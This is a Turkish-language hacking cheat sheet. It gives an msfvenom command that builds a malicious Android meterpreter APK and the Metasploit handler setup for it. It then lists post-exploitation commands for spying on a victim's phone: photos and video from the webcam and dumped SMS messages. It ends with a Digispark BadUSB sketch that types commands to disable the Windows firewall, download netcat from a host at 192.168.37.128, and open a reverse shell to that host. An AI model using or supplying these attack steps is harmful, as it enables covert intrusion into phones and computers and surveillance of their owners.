#msfvenom
______________________________________________________________________________________________________
msfvenom -p android/meterpreter/reverse_tcp LHOST=lan ip gelecek LPORT=4444 R > /var/www/html/ad.apk
______________________________________________________________________________________________________

#msfconsole
______________________________________________________________________________________________________
use exploit/multi/handler
use payload  android/meterpreter/reverse_tcp 
payload=> android/meterpreter/reverse_tcp 
show options
set LHOST lan ip adresi
exploit
___________________________________________________________________________________________________________________
#Başarılı bir şekilde hedef cihaza kurduktan sonra şu komutları kullanarak telefonda yetkilerinizi kullanabilirsiniz
___________________________________________________________________________________________________________________
app_list   =  uygulamaları listeler
webcam_snap  = fotoğraf çeker
webcam_stream  = video kaydı alır
demp_sms2  = smsleri alıp notdefterinde bize listeler
_________________________________________________________________________________

MSFCONSOLE TEMEL KOMUTLar
_________________________________________________________________________________

#*back*#
use komutunu kullanarak seçtiğiniz bir modülü aktif ettiğinizde, modülü kullanmaktan vazgeçebilirsiniz. Bu durumda, bir üst klasöre geri gelmek istediğinizde kullanılır. Teknik olarak çok gerekli değildir çünkü bulunduğunuz modülün içinde de yeni modül seçtiğinizde o modülden çıkmış olusunuz.
_________________________________________________________________________________________________________________________________________________________________________
https://siberoloji.github.io/Metasploit-temel-komutlar-ve-acikalamalari/ <<<==== şuradaki linkten daha detaylı bakabilirins






#define kdb_tr_tr
#include "DigiKeyboard.h" // <-- bu tanımlama ise bu kartı bir klavye olarak kullanacağımızı belirtir.
void setup() {
  // boş kalsın.
}

void loop() {
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(300);
DigiKeyboard.print("system32");
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(899);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(800);
DigiKeyboard.print("netsh firewall set opmode disable");
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(300);
DigiKeyboard.print("curl =o nc/exe http?&&192/168/37/128/nc/exe");
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(300);
DigiKeyboard.print("nc 192/168/37/128 8080 =e cmd/exe");
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(300);
DigiKeyboard.print("netsh firewall set opmode enable");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(300);
DigiKeyboard.print("exıt");
DigiKeyboard.delay(500);
    for (;;){} // <-- burdaki işlem ise döngünün sonlanmasını sağlıyor. Bunu yazmas iseniz döngü sonsuz dönecektir.
}














